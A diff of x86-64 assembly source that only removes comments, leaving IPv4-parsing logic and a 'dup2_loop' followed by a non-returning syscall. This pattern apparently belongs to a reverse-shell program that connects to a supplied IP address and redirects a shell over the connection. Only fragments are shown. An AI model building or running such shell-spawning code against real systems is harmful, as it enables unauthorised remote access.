@@ -49,18 +49,15 @@ parse_ip_loop:
     cmp rdx, '.'                 
     je store_octet
     
-    ; Check if character is digit
     cmp rdx, '0'
     jb ip_invalid
     cmp rdx, '9'
     ja ip_invalid
     
-    ; Convert digit and add to current number
     sub rdx, '0'
     imul rax, 10
     add rax, rdx
     
-    ; Check if number exceeds 255
     cmp rax, 255
     ja ip_invalid
     
@@ -68,11 +65,9 @@ parse_ip_loop:
     jmp parse_ip_loop
 
 store_octet:
-    ; Store current octet in the correct position
     cmp rbx, 3               
     jae ip_invalid
     
-    ; Shift existing value and add new octet
     shl r9, 8
     or r9, rax
     
@@ -82,16 +77,13 @@ store_octet:
     jmp parse_ip_loop
 
 validate_last_octet:
-    ; Store the last octet
     cmp rbx, 3              
     jne ip_invalid
     
     shl r9, 8
     or r9, rax
     
-    ; Store final IP in network byte order
     mov eax, r9d
-    ; Convert to network byte order (swap bytes)
     bswap eax
     mov dword [ip_bytes], eax
     
@@ -211,7 +203,6 @@ dup2_loop:
     xor rdx, rdx        
     syscall
     
-    ; Should not reach here
     jmp exit_with_error
 
 ip_format_error:
